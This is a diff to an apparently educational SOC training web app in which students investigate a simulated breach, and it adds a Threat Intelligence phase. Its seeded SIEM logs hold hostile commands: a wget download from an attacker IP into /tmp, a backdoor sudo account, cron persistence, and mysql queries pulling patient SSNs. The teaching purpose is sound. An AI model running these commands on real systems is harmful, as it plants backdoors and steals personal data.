@@ -27,7 +27,7 @@
 
   /* NAV */
   #nav { display: flex; background: var(--bg2); border-bottom: 1px solid var(--border); padding: 0; overflow-x: auto; box-shadow: 0 2px 20px rgba(0,212,255,0.08); }
-  .nav-btn { padding: 12px 18px; background: none; border: none; color: var(--text-dim); cursor: pointer; font-family: inherit; font-size: 13px; white-space: nowrap; border-bottom: 2px solid transparent; transition: all 0.2s; }
+  .nav-btn { padding: 12px 18px; background: none; border: none; color: var(--text-dim); cursor: pointer; font-family: inherit; font-size: 14px; white-space: nowrap; border-bottom: 2px solid transparent; transition: all 0.2s; }
   .nav-btn:hover { color: var(--text-bright); background: rgba(0,212,255,0.06); }
   .nav-btn.active { color: var(--accent); border-bottom-color: var(--accent); text-shadow: 0 0 12px rgba(0,212,255,0.6); }
   .nav-btn.locked { color: #2a3f5f; cursor: not-allowed; }
@@ -37,26 +37,26 @@
   .nav-btn.completed { color: var(--green); }
 
   /* PAGES */
-  .page { display: none; padding: 30px; max-width: 1000px; margin: 0 auto; }
+  .page { display: none; padding: 24px 32px; max-width: 1280px; margin: 0 auto; }
   .page.active { display: block; }
 
   /* CARDS */
-  .card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 24px; margin-bottom: 20px; box-shadow: 0 1px 12px rgba(0,0,0,0.4); }
-  .card h2 { color: var(--text-bright); font-size: 18px; margin-bottom: 12px; }
-  .card h3 { color: var(--accent); font-size: 15px; margin-bottom: 10px; }
-  .card p, .card li { color: var(--text); line-height: 1.7; font-size: 14px; }
+  .card { background: var(--bg2); border: 1px solid var(--border); border-radius: 10px; padding: 28px; margin-bottom: 20px; box-shadow: 0 1px 12px rgba(0,0,0,0.4); }
+  .card h2 { color: var(--text-bright); font-size: 20px; margin-bottom: 12px; }
+  .card h3 { color: var(--accent); font-size: 16px; margin-bottom: 10px; }
+  .card p, .card li { color: var(--text); line-height: 1.7; font-size: 15px; }
   .card ul, .card ol { padding-left: 20px; margin-top: 8px; }
   .card li { margin-bottom: 4px; }
 
   /* ALERTS */
-  .alert { border-radius: 6px; padding: 12px 16px; margin-bottom: 16px; font-size: 13px; }
+  .alert { border-radius: 6px; padding: 12px 16px; margin-bottom: 16px; font-size: 14px; }
   .alert-red    { background: rgba(255,71,87,0.1);  border: 1px solid var(--red);    color: #ff6b7a; }
   .alert-yellow { background: rgba(255,211,42,0.08); border: 1px solid var(--yellow); color: var(--yellow); }
   .alert-green  { background: rgba(0,255,136,0.08);  border: 1px solid var(--green);  color: var(--green); }
   .alert-blue   { background: rgba(0,212,255,0.08);  border: 1px solid var(--accent); color: var(--accent); }
 
   /* BUTTONS */
-  .btn { padding: 8px 16px; border-radius: 6px; border: none; cursor: pointer; font-family: inherit; font-size: 13px; transition: all 0.18s; }
+  .btn { padding: 9px 18px; border-radius: 6px; border: none; cursor: pointer; font-family: inherit; font-size: 14px; transition: all 0.18s; }
   .btn-primary { background: linear-gradient(135deg, #00c853, #00e676); color: #000; font-weight: bold; box-shadow: 0 0 12px rgba(0,230,118,0.35); }
   .btn-primary:hover { background: linear-gradient(135deg, #00e676, #69ff8a); box-shadow: 0 0 18px rgba(0,230,118,0.55); transform: translateY(-1px); }
   .btn-blue { background: linear-gradient(135deg, #0070f3, #00b4ff); color: #fff; font-weight: bold; box-shadow: 0 0 10px rgba(0,180,255,0.3); }
@@ -175,8 +175,8 @@
     #pdf-cover .cover-meta-row .value { color:#1a1a2e; font-weight:bold; }
     #pdf-cover .cover-footer { margin-top:60px; font-size:11px; color:#aaa; }
     .page { display: block !important; }
-    #page0, #page1, #page2, #page3, #page4, #page5, #page7, #page8, #page9, #page10 { display: none !important; }
-    #page6 { display: block !important; }
+    #page0, #page1, #page2, #page3, #page4, #page5, #page6, #page8, #page9, #page10, #page11 { display: none !important; }
+    #page7 { display: block !important; }
     .no-print { display: none !important; }
     textarea.report-field { border:1px solid #ccc; background:#fff; color:#000; font-family: Georgia, serif; font-size:12px; height:auto; min-height:0; overflow:visible; resize:none; }
     input.report-field, select.report-field { border:none; border-bottom:1px solid #ccc; background:#fff; color:#000; font-size:13px; }
@@ -213,13 +213,14 @@
   <button class="nav-btn" onclick="goTo(1)" id="nb1"><span class="phase-num">1</span>Interview</button>
   <button class="nav-btn" onclick="goTo(2)" id="nb2"><span class="phase-num">2</span>SIEM</button>
   <button class="nav-btn" onclick="goTo(3)" id="nb3"><span class="phase-num">3</span>Terminal</button>
-  <button class="nav-btn" onclick="goTo(4)" id="nb4"><span class="phase-num">4</span>Python Task</button>
-  <button class="nav-btn" onclick="goTo(5)" id="nb5"><span class="phase-num">5</span>Playbook</button>
-  <button class="nav-btn" onclick="goTo(6)" id="nb6"><span class="phase-num">6</span>Final Report</button>
-  <button class="nav-btn" onclick="goTo(7)" id="nb7"><span class="phase-num">7</span>Notebook</button>
-  <button class="nav-btn" onclick="goTo(8)" id="nb8"><span class="phase-num">?</span>Resources</button>
-  <button class="nav-btn" onclick="goTo(9)" id="nb9"><span class="phase-num">S</span>Sample Texts</button>
-  <button class="nav-btn" onclick="goTo(10)" id="nb10" style="margin-left:auto;"><span class="phase-num">R</span>Rubric</button>
+  <button class="nav-btn" onclick="goTo(4)" id="nb4"><span class="phase-num">4</span>Threat Intel</button>
+  <button class="nav-btn" onclick="goTo(5)" id="nb5"><span class="phase-num">5</span>Python Task</button>
+  <button class="nav-btn" onclick="goTo(6)" id="nb6"><span class="phase-num">6</span>Playbook</button>
+  <button class="nav-btn" onclick="goTo(7)" id="nb7"><span class="phase-num">7</span>Final Report</button>
+  <button class="nav-btn" onclick="goTo(8)" id="nb8"><span class="phase-num">8</span>Notebook</button>
+  <button class="nav-btn" onclick="goTo(9)" id="nb9"><span class="phase-num">?</span>Resources</button>
+  <button class="nav-btn" onclick="goTo(10)" id="nb10"><span class="phase-num">S</span>Sample Texts</button>
+  <button class="nav-btn" onclick="goTo(11)" id="nb11" style="margin-left:auto;"><span class="phase-num">R</span>Rubric</button>
 </div>
 <div style="background:#161b22; border-bottom:1px solid #30363d; padding:8px 16px; display:flex; align-items:center; gap:12px;" class="no-print">
   <span id="autosave-status" style="color:#a8b8d0; font-size:12px; flex:1;">Autosave active</span>
@@ -503,7 +504,7 @@
     </div>
     <div id="terminal-output" onclick="document.getElementById('terminal-input').focus()"></div>
     <div id="terminal-input-row">
-      <span id="terminal-prompt-label">analyst@clearpath-prod-01:~$</span>
+      <span id="terminal-prompt-label">analyst@clearpath-prod-01:/home$</span>
       <input type="text" id="terminal-input" placeholder="" onkeydown="handleTerminal(event)" autocomplete="off" spellcheck="false">
     </div>
   </div>
@@ -517,18 +518,52 @@
   <div class="card">
     <h3>Investigation Notes — Terminal</h3>
     <p class="field-label">What artifacts did you find on the system? What do they indicate?</p>
-    <textarea class="report-field" id="terminal-notes" placeholder="e.g., Found a suspicious cron job running every 5 minutes that beacons to 185.220.101.42. Also found a new user account 'svc_backup' created at 02:14 AM..."></textarea>
+    <textarea class="report-field" id="terminal-notes" placeholder="e.g., Found a suspicious cron job running every 5 minutes that beacons to 185.220.101.42. Also found a new user account 'service_backup' created at 02:14 AM..."></textarea>
   </div>
 
   <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
     <button class="btn btn-gray" onclick="goTo(2)">&larr; Back</button>
     <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
-    <button class="btn btn-primary" onclick="goTo(4)">Proceed to Python Task &rarr;</button>
+    <button class="btn btn-primary" onclick="goTo(4)">Proceed to Threat Intel &rarr;</button>
   </div>
 </div>
 
-<!-- ===================== PAGE 4: PYTHON ===================== -->
+<!-- ===================== PAGE 4: THREAT INTEL ===================== -->
 <div class="page" id="page4">
+  <div class="card">
+    <h2>Phase 4 — Threat Intelligence</h2>
+    <p>By now you've identified a suspicious IP address that appears repeatedly across the SIEM logs and terminal artifacts: <strong style="color:#f0f6fc;">185.220.101.42</strong>. Before writing your incident report, a real SOC analyst would research this IP to understand who or what they're dealing with.</p>
+    <br>
+    <p style="color:#a8b8d0; font-size:13px;">Open a new browser tab and search for this IP address. Try Googling it, or use a threat intelligence tool like <strong>AbuseIPDB</strong> or <strong>Shodan</strong>. Document what you find below.</p>
+  </div>
+
+  <div class="card">
+    <h3>What did you find?</h3>
+    <p class="field-label">Search the IP address <code style="color:#f0f6fc;">185.220.101.42</code> and summarize what the results tell you. What kind of infrastructure is this? Has it been reported before? For what activity?</p>
+    <textarea class="report-field" id="intel-what" placeholder="e.g., The IP showed up on AbuseIPDB with over 400 abuse reports. It has been flagged for SSH brute force attacks and port scanning..."></textarea>
+  </div>
+
+  <div class="card">
+    <h3>What does this mean for the investigation?</h3>
+    <p class="field-label">Based on what you found, what does this tell you about the attacker? Does it change how confident you are in your findings? Explain.</p>
+    <textarea class="report-field" id="intel-meaning" placeholder="e.g., The fact that this IP is a known Tor exit node means the attacker was trying to hide their real location. It also means..."></textarea>
+  </div>
+
+  <div class="card">
+    <h3>Why does threat intelligence matter?</h3>
+    <p class="field-label">In your own words, explain why a SOC analyst would look up an IP address instead of just noting it in the report. What does this kind of research add to an investigation?</p>
+    <textarea class="report-field" id="intel-why"></textarea>
+  </div>
+
+  <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
+    <button class="btn btn-gray" onclick="goTo(3)">&larr; Back</button>
+    <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
+    <button class="btn btn-primary" onclick="goTo(5)">Proceed to Python Task &rarr;</button>
+  </div>
+</div>
+
+<!-- ===================== PAGE 5: PYTHON ===================== -->
+<div class="page" id="page5">
   <div class="card">
     <h2>Phase 4 — Python Automation Task</h2>
     <p>One of the key findings in this investigation is a <strong style="color:#f0f6fc;">brute force SSH attack</strong> that preceded the breach. A fellow analyst started writing a script to automatically detect this pattern in raw log files — but they left before finishing it, and it has bugs. Your job is to find and fix them so the script runs correctly.</p>
@@ -617,14 +652,14 @@ failed_attempts = {}
   </div>
 
   <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
-    <button class="btn btn-gray" onclick="goTo(3)">&larr; Back</button>
+    <button class="btn btn-gray" onclick="goTo(4)">&larr; Back</button>
     <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
-    <button class="btn btn-primary" onclick="goTo(5)">Proceed to Playbook &rarr;</button>
+    <button class="btn btn-primary" onclick="goTo(6)">Proceed to Playbook &rarr;</button>
   </div>
 </div>
 
 <!-- ===================== PAGE 5: PLAYBOOK ===================== -->
-<div class="page" id="page5">
+<div class="page" id="page6">
   <div class="card">
     <h2>Phase 5 — Incident Response Playbook</h2>
     <p>Using your investigation findings, complete the IR playbook below. This playbook follows the <strong style="color:#f0f6fc;">NIST Cybersecurity Framework (CSF)</strong> core functions and serves as the procedural record of your response to this incident.</p>
@@ -710,14 +745,14 @@ failed_attempts = {}
   </div>
 
   <div style="display:flex; justify-content:space-between; align-items:center; margin-top:10px; flex-wrap:wrap; gap:8px;">
-    <button class="btn btn-gray" onclick="goTo(4)">&larr; Back</button>
+    <button class="btn btn-gray" onclick="goTo(5)">&larr; Back</button>
     <span style="color:#a8b8d0; font-size:12px;">Switching devices? <button class="btn btn-gray" style="font-size:11px; padding:4px 10px;" onclick="saveMyWork()">Export .html</button></span>
-    <button class="btn btn-primary" onclick="goTo(6)">Proceed to Final Report &rarr;</button>
+    <button class="btn btn-primary" onclick="goTo(7)">Proceed to Final Report &rarr;</button>
   </div>
 </div>
 
 <!-- ===================== PAGE 6: FINAL REPORT ===================== -->
-<div class="page" id="page6">
+<div class="page" id="page7">
   <div class="card">
     <h2>Phase 6 — Final Analyst Report</h2>
     <p>This is your portfolio deliverable. Write a professional incident analysis report that you could present to a client or include in a job application. Use your findings from all previous phases.</p>
@@ -802,6 +837,12 @@ failed_attempts = {}
     </div>
 
     <div class="report-section">
+      <h3 style="color:#e3b341;">Bonus — Resume Builder</h3>
+      <p style="color:#a8b8d0; font-size:13px; margin-bottom:10px;">Based on everything you did in this project, write 2–3 bullet points you could actually put on a resume or college application. Think about what skills you demonstrated — not just what you learned.</p>
+      <textarea class="report-field" id="rpt-resume" style="min-height:110px;" placeholder="e.g., Conducted a simulated cybersecurity incident investigation, analyzing SIEM logs and Linux server artifacts to identify an unauthorized intrusion and data exfiltration event..."></textarea>
+    </div>
+
+    <div style="margin-top:24px; padding-top:20px; border-top:1px solid #30363d;">
       <h3>7. Appendix — Completed IR Playbook</h3>
       <p style="color:#a8b8d0; font-size:13px;">Your IR Playbook from Phase 5 is automatically included as an appendix to this report. Ensure it is complete before exporting to PDF.</p>
       <div class="alert alert-blue" style="margin-top:10px;">Your Phase 5 playbook entries will be referenced here in a complete submission. Review Phase 5 to ensure all fields are filled out.</div>
@@ -814,12 +855,12 @@ failed_attempts = {}
   </div>
 
   <div style="display:flex; justify-content:space-between; margin-top:10px;">
-    <button class="btn btn-gray" onclick="goTo(5)">&larr; Back to Playbook</button>
+    <button class="btn btn-gray" onclick="goTo(6)">&larr; Back to Playbook</button>
   </div>
 </div>
 
 <!-- ===================== PAGE 7: NOTEBOOK ===================== -->
-<div class="page" id="page7">
+<div class="page" id="page8">
   <div class="card">
     <h2>Analyst Notebook</h2>
     <p>Use this space to take notes throughout your investigation. This page is for your eyes only — it is <strong style="color:#f0f6fc;">not graded</strong> and will not appear in your PDF report. Think of it as your scratch paper.</p>
@@ -859,7 +900,7 @@ failed_attempts = {}
 </div>
 
 <!-- ===================== PAGE 8: RESOURCES ===================== -->
-<div class="page" id="page8">
+<div class="page" id="page9">
   <div class="card">
     <h2>Resources &amp; Help</h2>
     <p>Use this page if you get stuck. It won't tell you what to find — but it will help you understand what you're looking at and fix common technical problems.</p>
@@ -1074,7 +1115,7 @@ failed_attempts = {}
 </div>
 
 <!-- ===================== PAGE 9: SAMPLE TEXTS ===================== -->
-<div class="page" id="page9">
+<div class="page" id="page10">
   <div class="card">
     <h2>Sample Texts — Reference Only</h2>
     <p>These are fully written fictional examples from a completely different incident at a different company. Read them to understand what professional, finished work looks like — the depth, the tone, and how each section connects. They have nothing to do with this exercise.</p>
@@ -1137,7 +1178,7 @@ failed_attempts = {}
 </div>
 
 <!-- ===================== PAGE 10: GRADING RUBRIC ===================== -->
-<div class="page" id="page10">
+<div class="page" id="page11">
   <div class="card" style="border-color:var(--accent);">
     <h2 style="color:var(--text-bright);">Grading Rubric</h2>
     <p style="font-size:13px; color:var(--text-dim); margin-top:6px;">This project is worth <strong style="color:var(--accent);">110 points</strong> across 6 phases. Use this rubric to guide your work and make sure you've addressed every criterion before submitting.</p>
@@ -1604,14 +1645,14 @@ async function initSiem() {
   // successful login
   siemDB.run(`INSERT INTO events VALUES (48,'2026-05-18 02:14:33','AUTH_SUCCESS','185.220.101.42','root','Accepted password for root from 185.220.101.42 port 31337 ssh2','critical')`);
   // account creation
-  siemDB.run(`INSERT INTO events VALUES (49,'2026-05-18 02:14:51','USER_CREATED','185.220.101.42','root','New user account created: svc_backup (UID 1003, added to sudo group)','critical')`);
+  siemDB.run(`INSERT INTO events VALUES (49,'2026-05-18 02:14:51','USER_CREATED','185.220.101.42','root','New user account created: service_backup (UID 1003, added to sudo group)','critical')`);
   // normal events — day of and nearby
   siemDB.run(`INSERT INTO events VALUES (50,'2026-05-18 08:03:11','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (51,'2026-05-17 23:41:02','AUTH_FAILURE','45.33.32.156','admin','Failed password for admin from 45.33.32.156 port 22341 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (52,'2026-05-18 02:17:44','FIREWALL_ALLOW','185.220.101.42','—','Outbound connection allowed: 185.220.101.42:4444 (established)','high')`);
   siemDB.run(`INSERT INTO events VALUES (53,'2026-05-18 02:22:15','FIREWALL_ALLOW','185.220.101.42','—','Outbound connection allowed: 185.220.101.42:4444 (established)','high')`);
-  siemDB.run(`INSERT INTO events VALUES (54,'2026-05-18 07:55:00','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
-  siemDB.run(`INSERT INTO events VALUES (55,'2026-05-18 03:01:09','AUTH_SUCCESS','185.220.101.42','svc_backup','Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2','critical')`);
+  siemDB.run(`INSERT INTO events VALUES (54,'2026-05-18 07:55:00','AUTH_SUCCESS','10.0.0.8','billing_service','Service account login: billing_service authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (55,'2026-05-18 03:01:09','AUTH_SUCCESS','185.220.101.42','service_backup','Accepted password for service_backup from 185.220.101.42 port 31338 ssh2','critical')`);
 
   // Background noise — May 14
   siemDB.run(`INSERT INTO events VALUES (56,'2026-05-14 08:47:03','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 51204 ssh2','low')`);
@@ -1621,7 +1662,7 @@ async function initSiem() {
 
   // Background noise — May 15
   siemDB.run(`INSERT INTO events VALUES (60,'2026-05-15 08:55:02','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 49312 ssh2','low')`);
-  siemDB.run(`INSERT INTO events VALUES (61,'2026-05-15 09:10:44','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (61,'2026-05-15 09:10:44','AUTH_SUCCESS','10.0.0.8','billing_service','Service account login: billing_service authenticated','low')`);
   siemDB.run(`INSERT INTO events VALUES (62,'2026-05-15 14:22:09','AUTH_FAILURE','198.51.100.23','admin','Failed password for admin from 198.51.100.23 port 44211 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (63,'2026-05-15 14:22:11','AUTH_FAILURE','198.51.100.23','root','Failed password for root from 198.51.100.23 port 44213 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (64,'2026-05-15 14:22:14','AUTH_FAILURE','198.51.100.23','ubuntu','Failed password for ubuntu from 198.51.100.23 port 44217 ssh2','low')`);
@@ -1629,14 +1670,14 @@ async function initSiem() {
 
   // Background noise — May 16
   siemDB.run(`INSERT INTO events VALUES (66,'2026-05-16 08:51:14','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 52100 ssh2','low')`);
-  siemDB.run(`INSERT INTO events VALUES (67,'2026-05-16 09:10:03','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (67,'2026-05-16 09:10:03','AUTH_SUCCESS','10.0.0.8','billing_service','Service account login: billing_service authenticated','low')`);
   siemDB.run(`INSERT INTO events VALUES (68,'2026-05-16 11:33:29','FIREWALL_BLOCK','103.41.167.33','—','Inbound connection blocked: port scan detected from 103.41.167.33','low')`);
   siemDB.run(`INSERT INTO events VALUES (69,'2026-05-16 16:08:11','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 50019 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (70,'2026-05-16 17:55:44','AUTH_SUCCESS','10.0.0.5','jreyes','session closed for user jreyes','low')`);
 
   // Background noise — May 17
   siemDB.run(`INSERT INTO events VALUES (71,'2026-05-17 09:00:11','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 53801 ssh2','low')`);
-  siemDB.run(`INSERT INTO events VALUES (72,'2026-05-17 09:15:22','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (72,'2026-05-17 09:15:22','AUTH_SUCCESS','10.0.0.8','billing_service','Service account login: billing_service authenticated','low')`);
   siemDB.run(`INSERT INTO events VALUES (73,'2026-05-17 13:04:05','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 51233 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (74,'2026-05-17 14:30:19','FIREWALL_ALLOW','10.0.0.5','—','Outbound HTTPS to 142.250.80.46:443 (allowed)','low')`);
   siemDB.run(`INSERT INTO events VALUES (75,'2026-05-17 15:44:21','AUTH_FAILURE','91.240.118.172','oracle','Failed password for oracle from 91.240.118.172 port 55001 ssh2','low')`);
@@ -1660,7 +1701,7 @@ async function initSiem() {
   siemDB.run(`INSERT INTO events VALUES (89,'2026-05-18 06:25:09','FIREWALL_ALLOW','10.0.0.8','—','Outbound connection to payment-gateway.clearpath.internal:443 (established)','low')`);
   siemDB.run(`INSERT INTO events VALUES (90,'2026-05-18 07:48:58','AUTH_SUCCESS','10.0.0.5','jreyes','Accepted publickey for jreyes from 10.0.0.5 port 54100 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (91,'2026-05-18 08:20:14','AUTH_SUCCESS','10.0.0.12','dev_marcus','Accepted publickey for dev_marcus from 10.0.0.12 port 51900 ssh2','low')`);
-  siemDB.run(`INSERT INTO events VALUES (92,'2026-05-18 08:31:02','AUTH_SUCCESS','10.0.0.8','billing_svc','Service account login: billing_svc authenticated','low')`);
+  siemDB.run(`INSERT INTO events VALUES (92,'2026-05-18 08:31:02','AUTH_SUCCESS','10.0.0.8','billing_service','Service account login: billing_service authenticated','low')`);
   siemDB.run(`INSERT INTO events VALUES (93,'2026-05-18 09:05:14','AUTH_FAILURE','203.0.113.44','root','Failed password for root from 203.0.113.44 port 61100 ssh2','low')`);
   siemDB.run(`INSERT INTO events VALUES (94,'2026-05-18 09:05:17','AUTH_FAILURE','203.0.113.44','admin','Failed password for admin from 203.0.113.44 port 61103 ssh2','low')`);
 
@@ -1672,24 +1713,24 @@ async function initSiem() {
   siemDB.run(`INSERT INTO db_query_log VALUES (7,'2026-05-18 02:21:33','root','SELECT * FROM user_credentials',12,1)`);
 
   // DB query log — normal business queries (not flagged)
-  siemDB.run(`INSERT INTO db_query_log VALUES (4,'2026-05-16 09:11:03','billing_svc','SELECT invoice_id, amount, status FROM billing_records WHERE due_date = CURDATE()',12,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (4,'2026-05-16 09:11:03','billing_service','SELECT invoice_id, amount, status FROM billing_records WHERE due_date = CURDATE()',12,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (5,'2026-05-16 10:44:22','dev_marcus','SELECT COUNT(*), created_at FROM patients GROUP BY DATE(created_at) ORDER BY created_at DESC LIMIT 30',30,0)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (8,'2026-05-16 14:05:01','billing_svc','UPDATE billing_records SET status = \"processed\" WHERE due_date < \"2026-05-16\" AND status = \"pending\"',8,0)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (9,'2026-05-17 09:16:44','billing_svc','SELECT p.name, b.invoice_id, b.amount FROM patients p JOIN billing_records b ON p.id = b.patient_id WHERE b.status = \"pending\"',44,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (8,'2026-05-16 14:05:01','billing_service','UPDATE billing_records SET status = \"processed\" WHERE due_date < \"2026-05-16\" AND status = \"pending\"',8,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (9,'2026-05-17 09:16:44','billing_service','SELECT p.name, b.invoice_id, b.amount FROM patients p JOIN billing_records b ON p.id = b.patient_id WHERE b.status = \"pending\"',44,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (10,'2026-05-17 11:30:09','jreyes','SELECT username, last_login, is_admin FROM user_accounts ORDER BY last_login DESC',6,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (11,'2026-05-17 14:33:01','jreyes','SELECT COUNT(*) FROM patients',1,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (12,'2026-05-17 14:55:22','dev_marcus','SELECT * FROM patients WHERE created_at > \"2026-04-01\" LIMIT 50',50,0)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (13,'2026-05-17 16:02:18','billing_svc','INSERT INTO billing_records (patient_id, amount, status, due_date) VALUES (1142, 340.00, \"pending\", \"2026-06-01\")',1,0)`);
-  siemDB.run(`INSERT INTO db_query_log VALUES (14,'2026-05-18 08:10:22','billing_svc','SELECT invoice_id, amount FROM billing_records WHERE status = \"pending\"',44,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (13,'2026-05-17 16:02:18','billing_service','INSERT INTO billing_records (patient_id, amount, status, due_date) VALUES (1142, 340.00, \"pending\", \"2026-06-01\")',1,0)`);
+  siemDB.run(`INSERT INTO db_query_log VALUES (14,'2026-05-18 08:10:22','billing_service','SELECT invoice_id, amount FROM billing_records WHERE status = \"pending\"',44,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (15,'2026-05-18 08:45:03','dev_marcus','SELECT id, name, created_at FROM patients ORDER BY created_at DESC LIMIT 100',100,0)`);
   siemDB.run(`INSERT INTO db_query_log VALUES (16,'2026-05-18 09:02:11','jreyes','SELECT * FROM user_accounts',6,0)`);
 
   // Process log — attack sequence
   siemDB.run(`INSERT INTO process_log VALUES (1,'2026-05-18 02:14:38','clearpath-prod-01',3249,'root','wget -q http://185.220.101.42:8080/update_check -O /tmp/.update_check',1)`);
   siemDB.run(`INSERT INTO process_log VALUES (2,'2026-05-18 02:14:41','clearpath-prod-01',3250,'root','chmod +x /tmp/.update_check',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (3,'2026-05-18 02:14:44','clearpath-prod-01',3251,'root','useradd -m -u 1004 -g 0 svc_backup',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (4,'2026-05-18 02:14:46','clearpath-prod-01',3252,'root','usermod -aG sudo svc_backup',1)`);
-  siemDB.run(`INSERT INTO process_log VALUES (5,'2026-05-18 02:14:50','clearpath-prod-01',3253,'root','echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/svc_backup_task',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (3,'2026-05-18 02:14:44','clearpath-prod-01',3251,'root','useradd -m -u 1004 -g 0 service_backup',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (4,'2026-05-18 02:14:46','clearpath-prod-01',3252,'root','usermod -aG sudo service_backup',1)`);
+  siemDB.run(`INSERT INTO process_log VALUES (5,'2026-05-18 02:14:50','clearpath-prod-01',3253,'root','echo "*/5 * * * * root /tmp/.update_check 2>/dev/null" > /etc/cron.d/service_backup_task',1)`);
   siemDB.run(`INSERT INTO process_log VALUES (6,'2026-05-18 02:19:02','clearpath-prod-01',3289,'root','mysql -u root -p clearpath_db -e "SELECT * FROM patients LIMIT 1000"',1)`);
   siemDB.run(`INSERT INTO process_log VALUES (7,'2026-05-18 02:19:39','clearpath-prod-01',3290,'root','mysql -u root -p clearpath_db -e "SELECT name, dob, ssn, insurance_id FROM patients WHERE billing_status = active"',1)`);
   siemDB.run(`INSERT INTO process_log VALUES (8,'2026-05-18 02:20:11','clearpath-prod-01',3291,'root','mysql -u root -p clearpath_db -e "SELECT * FROM billing_records WHERE created_at > 2026-01-01"',1)`);
@@ -1699,19 +1740,19 @@ async function initSiem() {
   // Process log — normal background activity
   siemDB.run(`INSERT INTO process_log VALUES (11,'2026-05-18 00:05:02','clearpath-prod-01',2901,'root','/usr/sbin/mysqldump clearpath_db --result-file=/var/backups/db_nightly.sql',0)`);
   siemDB.run(`INSERT INTO process_log VALUES (12,'2026-05-17 17:33:14','clearpath-prod-01',2744,'dev_marcus','mysql -u dev_marcus clearpath_db -e "SELECT COUNT(*) FROM patients"',0)`);
-  siemDB.run(`INSERT INTO process_log VALUES (13,'2026-05-18 08:10:19','clearpath-prod-01',3401,'billing_svc','/usr/bin/python3 /opt/billing/run_daily.py',0)`);
+  siemDB.run(`INSERT INTO process_log VALUES (13,'2026-05-18 08:10:19','clearpath-prod-01',3401,'billing_service','/usr/bin/python3 /opt/billing/run_daily.py',0)`);
   siemDB.run(`INSERT INTO process_log VALUES (14,'2026-05-18 08:31:00','clearpath-prod-01',3450,'analyst','/usr/bin/bash',0)`);
 
   // User accounts
   const accounts = [
     ['root','2020-03-01 00:00:00','2026-05-18 02:14:33',1,'active'],
     ['jreyes','2020-03-01 00:00:00','2026-05-18 08:03:11',1,'active'],
-    ['billing_svc','2021-06-15 09:00:00','2026-05-18 07:55:00',0,'active'],
+    ['billing_service','2021-06-15 09:00:00','2026-05-18 07:55:00',0,'active'],
     ['dev_marcus','2022-01-10 10:00:00','2026-05-12 16:44:00',0,'active'],
-    ['svc_backup','2026-05-18 02:14:51','2026-05-18 03:01:09',1,'active'],
+    ['service_backup','2026-05-18 02:14:51','2026-05-18 03:01:09',1,'active'],
     ['contractor_q1','2026-01-15 09:00:00','2026-02-28 17:30:00',0,'active'],
-    ['svc_monitor','2021-03-12 00:00:00','2026-05-18 00:07:00',0,'active'],
-    ['svc_email','2021-06-01 00:00:00','2026-05-17 23:59:01',0,'active'],
+    ['service_monitor','2021-03-12 00:00:00','2026-05-18 00:07:00',0,'active'],
+    ['service_email','2021-06-01 00:00:00','2026-05-17 23:59:01',0,'active'],
   ];
   accounts.forEach(a => siemDB.run(`INSERT INTO user_accounts VALUES (?,?,?,?,?)`, a));
   buildAlertFeed();
@@ -1912,23 +1953,25 @@ function buildAlertFeed() {
 // ===================== TERMINAL =====================
 const termHistory = [];
 let termHistIdx = -1;
-let termCwd = '/home/analyst';
